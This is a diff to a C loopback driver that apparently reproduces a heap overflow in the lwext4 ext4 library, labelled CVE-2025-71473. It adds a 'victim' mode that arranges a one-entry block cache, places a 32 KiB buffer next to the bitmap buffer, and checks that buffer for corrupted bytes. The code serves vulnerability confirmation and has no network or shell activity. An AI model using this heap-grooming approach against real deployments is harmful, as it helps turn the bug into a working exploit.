@@ -1,7 +1,8 @@
 /* Real-lwext4 loopback driver for CVE-2025-71473.
  * Usage: driver mk IMAGE     — create a pristine ext4 image via ext4_mkfs()
- *        driver mount IMAGE  — ext4_fs_init() then take block group 0 ref,
- *                               which runs ext4_fs_init_inode_bitmap().
+ *        driver mount IMAGE  — ext4_fs_init() then take block group 0 ref
+ *        driver victim IMAGE — as mount, but allocate a live 32 KiB victim
+ *                               after a one-entry bcache, then read it back.
  * No network, no block device, no command execution. */
 #include <stdio.h>
 #include <stdlib.h>
@@ -55,7 +56,7 @@ int main(int argc, char **argv)
 		return rc;
 	}
 
-	if (strcmp(mode, "mount")) {
+	if (strcmp(mode, "mount") && strcmp(mode, "victim")) {
 		fprintf(stderr, "unknown mode %s\n", mode);
 		return 2;
 	}
@@ -85,7 +86,10 @@ int main(int argc, char **argv)
 	       ext4_get32(&fs.sb, features_read_only));
 
 	struct ext4_bcache bc;
-	rc = ext4_bcache_init_dynamic(&bc, 16, bsize);
+	/* One bcache entry makes the bitmap buffer the first 4096-byte
+	 * allocation; a victim allocated after it sits in the adjacent chunk. */
+	rc = ext4_bcache_init_dynamic(&bc, !strcmp(mode, "victim") ? 1 : 16,
+				      bsize);
 	printf("BCACHE_RC=%d\n", rc);
 	if (rc)
 		return rc;
@@ -93,6 +97,13 @@ int main(int argc, char **argv)
 	printf("BIND_RC=%d\n", rc);
 	if (rc)
 		return rc;
+	int victim_mode = !strcmp(mode, "victim");
+	unsigned char *victim = NULL;
+	if (victim_mode) {
+		victim = malloc(32768);
+		memset(victim, 0x4d, 32768);
+		printf("VICTIM_PTR=%p VICTIM_LEN=32768\n", (void *)victim);
+	}
 
 	struct ext4_block_group_ref ref;
 	memset(&ref, 0, sizeof(ref));
@@ -100,6 +111,18 @@ int main(int argc, char **argv)
 	printf("BG_REF_RC=%d BG_FLAGS=%u\n", rc,
 	       rc ? 0u : ext4_get16(ref.block_group, flags));
 	if (!rc) {
+	if (!rc && victim) {
+		size_t first_diff = 0, fe_at = (size_t)-1;
+		while (first_diff < 32768 && victim[first_diff] == 0x4d)
+			first_diff++;
+		for (size_t j = 0; j < 32768; j++)
+			if (victim[j] == 0xfe) {
+				fe_at = j;
+				break;
+			}
+		printf("VICTIM_FIRST_DIFF=%zu VICTIM_FE_AT=%zu\n", first_diff,
+		       fe_at);
+	}
 		rc = ext4_fs_put_block_group_ref(&ref);
 		printf("BG_PUT_RC=%d\n", rc);
 	}
